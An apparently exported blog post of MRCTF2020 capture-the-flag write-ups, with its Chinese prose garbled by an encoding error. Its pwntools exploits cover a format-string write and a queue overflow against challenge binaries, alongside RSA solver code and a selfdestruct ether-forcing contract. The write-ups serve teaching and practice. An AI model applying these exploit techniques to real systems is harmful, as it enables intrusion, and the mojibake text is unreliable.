Shitè¿™é“é¢˜ç›®æ˜¯ä¸´æ—¶å‡ºçš„ï¼Œå…¶å®åªè¦è¿‡æ‰å¼€å±€çš„ä¸€ä¸ªæ­»å¾ªç¯ï¼Œä¹Ÿå¯ä»¥attachï¼Œç„¶ådumpå‡ºå¯†é’¥å°±å¯ä»¥ç›´æ¥è¿›è¡Œè§£å¯†äº†ï¼Œè§£å¯†ç®—æ³•å…¶å®å°±æ˜¯åŠ å¯†ç®—æ³•çš„é€†å‘è¿‡ç¨‹ï¼Œå…¨æ˜¯ä½è¿ç®— 1234567891011121314151617//keyå°±æ˜¯å¯†é’¥ è¯·ç›´æ¥dumpunsigned int ks[6]={0x8c2c133a,0xf74cb3f6,0xfedfa6f2,0xab293e3b,0x26cf8a2a,0x88a1f279};void decode(){ unsigned int k=0,bk=0; for(int i=5;i&gt;=0;i--) if(i&gt;0) ks[i]^=ks[i-1]; for(int i=0;i&lt;24;i+=4) { k=ks[i/4]; k=(1&lt;&lt;key[i/4])^k; k=((k&gt;&gt;16)) | ((~(k&lt;&lt;16))&amp;0xffff0000); k=((k&lt;&lt;key[i/4])) | (k&gt;&gt;(32-key[i/4])); printf(\"%X\\n\",k); }} è§£å¯†å‡ºå…­ä¸ªintï¼Œç›´æ¥è½¬asciiå°±æ˜¯flag Virtual Treeè¿™é“é¢˜é™æ€åˆ†æå®Œå…¨å°±æ˜¯é”™çš„ï¼Œå› ä¸ºæˆ‘åœ¨mainå‡½æ•°è¿è¡Œå‰ä¼šå°†ä¸€äº›å‡½æ•°ç»™æ›¿æ¢æ‰æ‰€ä»¥é™æ€åˆ†æå®Œå…¨å¤±è´¥çš„ï¼Œä½†æ˜¯ä¼¼ä¹å¤§éƒ¨åˆ†äººéƒ½æ˜¯åŠ¨è°ƒ2333 12345678910111213141516171819202122232425262728int replace() //å¼€å±€æ›¿æ¢å‡½æ•°ä»£ç ï¼Œ{ void *addr=doit; int val=(int)addr; DWORD old; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&amp;old)==NULL) exit(0); int count=0; while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==0x00401510) *((PDWORD)val)=(DWORD)list[count++]; //å°†ä¸€ä¸ªå…¨æ˜¯åŒä¸€ä¸ªcallçš„å‡½æ•°æ›¿æ¢æˆä¸ä¸€æ ·çš„å‡½æ•° val=val+1; } addr=main; val=(int)addr; if(VirtualProtect(addr,512,PAGE_EXECUTE_READWRITE,&amp;old)==NULL) exit(0); while(*((PBYTE)val)!=0x90) { if(*((PDWORD)val)==(DWORD)walkB) { *((PDWORD)val)=(DWORD)walkA; //åŠ å¯†ä»£ç çš„æ›¿æ¢ break; } val=val+1; }} æ‰€ä»¥ï¼Œéœ€è¦åŠ¨è°ƒæ¥çœ‹ä»£ç ï¼Œä»£ç æ‰æ˜¯å¯¹çš„ã€‚ã€‚ 1234567891011121314151617int sub_12F16F0() //å…·ä½“æ“ä½œå°±æ˜¯è¿™äº›åŠ å‡ å¼‚æˆ–{ Add(0, 10); Xor(1, 2); Add(2, 7); Sub_abs(3, 7); Xor(4, 5); Sub_abs(6, 1); Add(7, 3); Xor(8, 7); Sub_abs(9, 8); Sub_abs(10, 7); Xor(11, 12); Sub_abs(12, 2); Xor(14, 15); return Add(15, 2);} è¿˜æœ‰ä¸€ä¸ªå‡½æ•°å¯¹è¾“å…¥è¿›è¡Œäº†å¼‚æˆ–ï¼Œdumpå‡ºæ¥å°±æ˜¯äº†ã€‚ã€‚æ‰€ä»¥åªéœ€è¦å°†æ•°æ®æŒ‰ç…§sub_12F16F0()è§£æ–¹ç¨‹ä¹‹åï¼Œåœ¨å¼‚æˆ–dumpå‡ºæ¥çš„æ•°æ®å°±å¯ä»¥å¾—åˆ°flagäº†@_7r3e_f0r_fuNN! Cryptokeyboardå…¶å®å°±æ˜¯æ‰‹æœºé”®ç›˜æ¯è¡Œä»£è¡¨å½“ä¸ªæ•°å­—é”®ç›˜ä¸Šçš„å­—æ¯æ‘ä¸€æ¬¡å°±æ˜¯ç¬¬ä¸€ä¸ªä»¥æ­¤ç±»æ¨ã€‚ å¤©å¹²åœ°æ”¯+ç”²å­æŸ¥æ‰¾åˆ°å¤©å¹²åœ°æ”¯å›¾ï¼Œå‘ç°æ¯ä¸ªéƒ½å¯¹åº”ç€æ•°å­—ï¼Œç„¶åç”²å­æ˜¯60ï¼ŒæŠŠæ¯ä¸ªéƒ½åŠ ä¸Š60åç”¨asciiç è½¬ä¸‹å°±å¯ä»¥äº† babyRSAè¿™é¢˜æœ¬èº«é™¤äº†RSAè€ƒç‚¹å¤–ï¼Œè¿˜è€ƒå¯Ÿäº†æ¨¡å¹³æ–¹ç®—æ³•ï¼Œé‚£ä¸ªQå¦‚æœç¡¬æ€¼æ˜¯æ€¼ä¸å‡ºæ¥çš„ï¼Œå¿…é¡»æ¨¡å¹³æ–¹ï¼Œè‡³äºæ¨¡å¹³æ–¹ç®—æ³•ä»£ç ç½‘ä¸Šè›®å¤šï¼Œæˆ‘è¿™å°±ä¸è´´äº† easy_RSAæ¯”è¾ƒå…¸å‹çš„RSAå¥—å¨ƒï¼Œåˆ†åˆ«æ±‚å‡ºp,qï¼Œåˆ©ç”¨é¢˜å¹²ä¸­çš„ä¸€äº›å‡½æ•°å³å¯æ±‚è§£ï¼Œpï¼šå·²çŸ¥$\\phi(n)=(p-1)(q-1)$, $n=pq$ï¼Œåˆ©ç”¨z3çš„solveå®¹æ˜“æ±‚è§£qï¼šå·²çŸ¥$ed, n=pq$ï¼Œå¯çŸ¥$ed=k(p-1)(q-1)+1$ï¼Œåˆç”±äº$\\frac{ed-1}{n} \\leq k \\leq \\frac{ed-1}{2n}$åˆ©ç”¨è¿™ä¸ªåŒºé—´ï¼Œå¾ªç¯solveå³å¯ï¼Œexpå¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import sympyfrom gmpy2 import invertfrom Crypto.Util.number import getPrime, long_to_bytesfrom z3 import *base = 65537def gen_prime(N): while 1: A = getPrime(N) if A % 4 == 3: break return Adef GET_P(n, F_n): p = Int('p') q = Int('q') expr = And(F_n == (p - 1) * (q - 1), n == p * q, p &gt; 0, q &gt; 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() seed2 = 2021 * res_p + 2020 * res_q if seed2 &lt; 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2)def GET_Q(n, E_D ,judge): p = Int('p') q = Int('q') for k in range(judge, judge*2): expr = And(E_D - 1 == k * (p - 1) * (q - 1), n == p * q, p &gt; 0, q &gt; 0) solver = Solver() solver.add(expr) if solver.check() == sat: print(solver.model()) print(solver.model().eval(p)) print(print(solver.model().eval(q))) res_p = solver.model().eval(q).as_long() res_q = solver.model().eval(p).as_long() break seed2 = 2021 * res_p - 2020 * res_q if seed2 &lt; 0: seed2 = (-1) * seed2 return sympy.nextprime(seed2)P_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024336556028267742021320891681762543660468484018686865891073110757394154024833552558863671537491089957038648328973790692356014778420333896705595252711514117478072828880198506187667924020260600124717243067420876363980538994101929437978668709128652587073901337310278665778299513763593234951137512120572797739181693P_F_n = 14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199039812208100301939365080328518578704076769147484922508482686658959347725753762078590928561862163337382463252361958145933210306431342748775024099427363967321110127562039879018616082926935567951378185280882426903064598376668106616694623540074057210432790309571018778281723710994930151635857933293394780142192586806292968028305922173313521186946635709194350912242693822450297748434301924950358561859804256788098033426537956252964976682327991427626735740Q_n = 20714298338160449749545360743688018842877274054540852096459485283936802341271363766157976112525034004319938054034934880860956966585051684483662535780621673316774842614701726445870630109196016676725183412879870463432277629916669130494040403733295593655306104176367902352484367520262917943100467697540593925707162162616635533550262718808746254599456286578409187895171015796991910123804529825519519278388910483133813330902530160448972926096083990208243274548561238253002789474920730760001104048093295680593033327818821255300893423412192265814418546134015557579236219461780344469127987669565138930308525189944897421753947Q_E_D = 100772079222298134586116156850742817855408127716962891929259868746672572602333918958075582671752493618259518286336122772703330183037221105058298653490794337885098499073583821832532798309513538383175233429533467348390389323225198805294950484802068148590902907221150968539067980432831310376368202773212266320112670699737501054831646286585142281419237572222713975646843555024731855688573834108711874406149540078253774349708158063055754932812675786123700768288048445326199880983717504538825498103789304873682191053050366806825802602658674268440844577955499368404019114913934477160428428662847012289516655310680119638600315228284298935201Ciphertext = 40855937355228438525361161524441274634175356845950884889338630813182607485910094677909779126550263304194796000904384775495000943424070396334435810126536165332565417336797036611773382728344687175253081047586602838685027428292621557914514629024324794275772522013126464926990620140406412999485728750385876868115091735425577555027394033416643032644774339644654011686716639760512353355719065795222201167219831780961308225780478482467294410828543488412258764446494815238766185728454416691898859462532083437213793104823759147317613637881419787581920745151430394526712790608442960106537539121880514269830696341737507717448946962021if __name__ == &quot;__main__&quot;: judge = int(Q_E_D / Q_n) - 1 _E = base P = GET_P(P_n, P_F_n) Q = GET_Q(Q_n, Q_E_D, judge) _D = invert(_E, (P-1)*(Q-1)) M = pow(Ciphertext, _D, P*Q) flag = long_to_bytes(M) print(flag) real_randomåˆ©ç”¨äº†çº¿æ€§åŒä½™æ¥æ„é€ ä¼ªéšæœºï¼Œè§‚å¯Ÿå‘ç°b,c,mæ»¡è¶³æœ€å¤§å‘¨æœŸæ¡ä»¶ï¼Œæ•…çŸ¥æ¯æ¬¡ä»¥flag[t]ä¸ºç§å­ç”Ÿæˆçš„éšæœºæ•°åˆ—çš„å‘¨æœŸå‡ä¸ºmï¼Œé€šè¿‡æ³„éœ²çš„(p-1)*(q-1)å¯ä»¥ç®—å‡ºmï¼Œç„¶åå‡å»$2^d$ï¼ˆè®°å¾—å–æ¨¡ï¼‰å³å¯æ±‚è§£ å¤å…¸å¯†ç çŸ¥å¤šå°‘çŒªåœˆå¯†ç ï¼Œåœ£å ‚æ­¦å£«å¯†ç ï¼Œæ ‡å‡†é“¶æ²³å­—æ¯ï¼Œä¸”å·²æç¤ºéƒ½ä¸ºå¤§å†™å­—æ¯ è§£å¯†å¯å¾— FGCPFLIRTUASYON , å›¾ç‰‡é‡Œä¹Ÿæç¤ºfence ï¼Œæ•…å°è¯•æ …æ å¯†ç  æ¯ç»„å­—æ•°ä¸º3æ—¶å³å¯è§£å¾—flagï¼šMRCTF{CRYPTOFUN} PWNnothing_but_everythingæœ¬èº«æ˜¯ç®€å•çš„ROPï¼Œä½†æ˜¯æˆ‘é™æ€ç¼–è¯‘äº†ä¸€ä¸‹åï¼Œå»äº†ç¬¦å·ï¼Œæ‰€ä»¥å¦‚æœæƒ³çœ‹çš„æ¯”è¾ƒè½»æ¾ï¼Œéœ€è¦å»æ‰¾æ‰¾Ubuntuä¸‹çš„sigæ–‡ä»¶ç„¶åidaé‡Œå¯¼å…¥ï¼Œå°±å¯ä»¥å¤ç°ä¸å°‘å‡½æ•°çš„æ ·å­äº†ï¼Œæˆ–è€…å¯ä»¥ç»“åˆåŠ¨è°ƒï¼Œæ€»ä¹‹çœ‹æ‡‚é¢˜å°±å¾ˆç®€å•äº†ï¼Œç›´æ¥ROPgadgetä¸€æŠŠæ¢­ã€‚ easy_equationï¼ˆä¸‹é¢è¯´çš„éƒ½æ²¡ç”¨ï¼Œè¿™é¢˜å¿˜å…³æº¢å‡ºäº†ï¼Œç›´æ¥æº¢å‡ºå°±è¡Œå¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦æ¼æ´ï¼Œä½†æ˜¯åœ¨åˆ©ç”¨ä¸Šéœ€è¦ä¸€äº›æŠ€å·§ï¼Œé¦–å…ˆæ˜¯çœ‹åˆ°é‚£ä¸ªå…¬å¼ï¼Œç”¨z3çš„solveå¾ˆå¥½ç®—å‡ºæ¥è§£æ˜¯2ï¼Œä¹‹åæ€è·¯å°±å¾ˆæ˜ç¡®ï¼Œå°†judgeçš„å€¼è¦†å†™æˆ2å³å¯ï¼Œå¦‚æœç›´æ¥æƒ³è¦ç›´æ¥ç”¨fmstr_payloadè¿™ç§payloadè‡ªåŠ¨ç”Ÿæˆ,ä¼šæƒŠå–œçš„å‘ç°ï¼Œæ— æ³•é å¡«å……å­—ç¬¦è¾¾åˆ°åœ°å€å¯¹é½ï¼Œæ‰€ä»¥éœ€è¦è½¬æ¢ä¸€ä¸‹æ€è·¯ï¼Œè€ƒè™‘åˆ°åœ°å€çš„å°ç«¯åºå­˜å‚¨ï¼Œå¦‚æœåœ¨judge_addr-1çš„ä½ç½®å­˜å…¥0x200ï¼Œé‚£ä¹ˆjudge_addrçš„å€¼è‡ªç„¶ä¼šå˜æˆ0x02ï¼Œäºæ˜¯expï¼ˆä¸æ˜¯å”¯ä¸€è§£æ³•ï¼Œä¹Ÿå¯ä»¥æ­£å‘æ„é€ ï¼‰å¦‚ä¸‹ï¼š 123456789from pwn import *p = process('easy_equation')judge_addr = 0x60105Cpayload = 'a' * 6 + '%' + str(0x200 - 6) + 'c%10$hn'payload += p64(judge_addr - 1)p.sendline(payload)p.interactive() spfaæœ‰ä¸€ä¸ªæ˜æ˜¾çš„get_flagå‡½æ•°ï¼Œå‘ç°æ‰§è¡Œè¯¥å‡½æ•°çš„æ¡ä»¶æ˜¯flag!=-1ï¼Œä½†æ˜¯ç¨‹åºå¼€å¤´å·²ç»å°†flagèµ‹å€¼ä¸º-1ï¼Œå¹¶ä¸”ç¨‹åºå†…å¹¶æ²¡æœ‰æ¶‰åŠflagçš„è¿ç®—ï¼Œäºæ˜¯è€ƒè™‘é€šè¿‡æº¢å‡ºä¿®æ”¹flagã€‚æŸ¥çœ‹ä¸€ä¸‹bssæ®µå¯ä»¥å‘ç°ï¼Œflagå˜é‡åœ¨quæ•°ç»„ä¸‹æ–¹ï¼Œç›¸å½“äºqu[1000]ï¼Œåœ¨SPFAå‡½æ•°é‡Œç†è®ºå¯ä»¥è®¿é—®å¹¶ä¿®æ”¹qu[1000]ï¼Œäºæ˜¯éœ€è¦æ„å»ºç‰¹æ®Šçš„å›¾æ¥ä½¿é˜Ÿåˆ—ï¼ˆquæ•°ç»„ï¼‰è¶Šç•Œã€‚ä»”ç»†åˆ†æå¯ä»¥çŸ¥é“ï¼ŒSPFAç®—æ³•å­˜åœ¨ä¸€å¤„åˆ¤æ–­é”™è¯¯(if(d[y] &gt;= d[x] + len[node]))ï¼Œè¿™ä½¿å¾—å¦‚æœè·¯å¾„ä¸­å‡ºç°0ç¯ä¼šå‘ç”Ÿæ­»å¾ªç¯ï¼ŒèŠ‚ç‚¹ä¸æ–­å…¥é˜Ÿï¼Œæœ€åä½¿é˜Ÿåˆ—æº¢å‡ºã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬æ‰€åšçš„ï¼Œåªéœ€è¦æ„é€ ä¸€ä¸ª0ç¯ï¼Œç„¶åæ±‚æœ€çŸ­è·¯ã€‚expï¼š 12345678910111213141516171819202122from pwn import *p = process(&quot;./spfa&quot;)def add(a, b, c): p.sendlineafter(&quot;:\\n&quot;, str(1)) p.sendlineafter(&quot;:\\n&quot;, str(a) + &quot; &quot; + str(b) + &quot; &quot; + str(c))def query(a, b): p.sendlineafter(&quot;:\\n&quot;, str(2)) p.sendlineafter(&quot;:\\n&quot;, str(a) + &quot; &quot; + str(b))def get_flag(): p.sendlineafter(&quot;:\\n&quot;, str(3))add(1, 2, 0)add(2, 1, 0)query(1, 2)get_flag()p.interactive() Shellcodeä¸»è¦æƒ³è€ƒå¯ŸGooglehackèƒ½åŠ› æ²¡å•¥å¥½è¯´çš„ç›´æ¥å»http://shell-storm.org/shellcode/æ‰’ä¸ªx64 shellcodeä¸‹æ¥å°±å¯ä»¥äº† Shellcode Revengeä¸»è¦æƒ³è€ƒå¯ŸGooglehackèƒ½åŠ› idaå¯ä»¥åˆ†æå‡ºæäº¤çš„Shellcodeè¦æ»¡è¶³å…¨ä¸ºå¤§å°å†™å’Œæ•°å­—çš„é™åˆ¶ å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  https://hama.hatenadiary.jp/entry/2017/04/04/190129 EthereumSimpleRevealæœ¬é¢˜ä¸»è¦è€ƒå¯Ÿå¯¹ solidity å’Œ web3 çš„åº”ç”¨ã€‚ è§£æ³•ä¸€1234567pragma solidity&gt;=0.4.22;contract reveal { private string flag=&quot;some_string_here&quot;;} æ ¹æ®åŸåˆçº¦ï¼Œå¯ä»¥çœ‹åˆ° flag åº”è¯¥åœ¨åˆçº¦çš„å‰å‡ ä¸ªå˜é‡æ§½ä¸­ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ web3.eth.getStorageAt(&quot;åˆçº¦åœ°å€&quot;, 0) è·å–å­˜å‚¨çš„å˜é‡ï¼Œä»è€Œè§£ç å¾—åˆ°flagã€‚ è§£æ³•äºŒEtherscan ä¸Šå¯ä»¥çœ‹åˆ°åˆ›å»ºåˆçº¦ä¿¡æ¯ï¼Œå…¶ä¸­å¯ä»¥çœ‹åˆ° flag ã€‚ Unwanted Coin123456789101112131415161718192021222324252627282930pragma solidity &gt;=0.6.1;contract Modcoin { mapping(uint256 =&gt; bool) public is_successful; function recvpay() public payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); } function getflag(uint256 target) public { require((address(this).balance / 0.001 ether ) % 2 == 1,&quot;Not Wanted value&quot;); require(msg.sender.send(address(this).balance)); is_successful[target] = true; } fallback () external payable { require(((msg.value / 0.001 ether ) % 2 == 0 &amp;&amp; ((msg.value % 0.001 ether) == 0)), &quot;Not Accepting These Coins.&quot;); }} åŸåˆçº¦ä¸­ä¸¤ä¸ªæ”¯ä»˜å‡½æ•° recvpay() å’Œ fallback() éƒ½åªå…è®¸æ¥å—å¶æ•°å€0.001 etherçš„ä»˜æ¬¾ï¼Œè€Œåˆçº¦çš„getflagå‡½æ•°åˆ™è¦æ±‚å¥‡æ•°å€ 0.001 ether çš„åˆçº¦ä½™é¢æ‰å¯ä»¥æ‰§è¡Œï¼ˆå¹¶æ¸…ç©ºåˆçº¦ä½™é¢ï¼‰ï¼Œè¿™æ—¶å°±éœ€è¦ç»•è¿‡é™åˆ¶å‘åˆçº¦åœ°å€å‘é€etherï¼Œè€Œåˆçº¦è‡ªæ¯æˆ–æŒ–çŸ¿äº§ç”Ÿçš„etheræ˜¯æ— æ³•æ‹’ç»çš„ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹è‡ªæ¯åˆçº¦è¾¾åˆ°æ¡ä»¶ã€‚ 12345678910contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); }}","link":"/2020/04/03/MRCTF2020/"}],"tags":[{"name":"bypass canary","slug":"bypass-canary","link":"/tags/bypass-canary/"},{"name":"rce","slug":"rce","link":"/tags/rce/"},{"name":"php","slug":"php","link":"/tags/php/"},{"name":"pop","slug":"pop","link":"/tags/pop/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"mrctf","slug":"mrctf","link":"/tags/mrctf/"}],"categories":[{"name":"Pwn","slug":"Pwn","link":"/categories/Pwn/"},{"name":"web","slug":"web","link":"/categories/web/"},{"name":"contest","slug":"contest","link":"/categories/contest/"}]}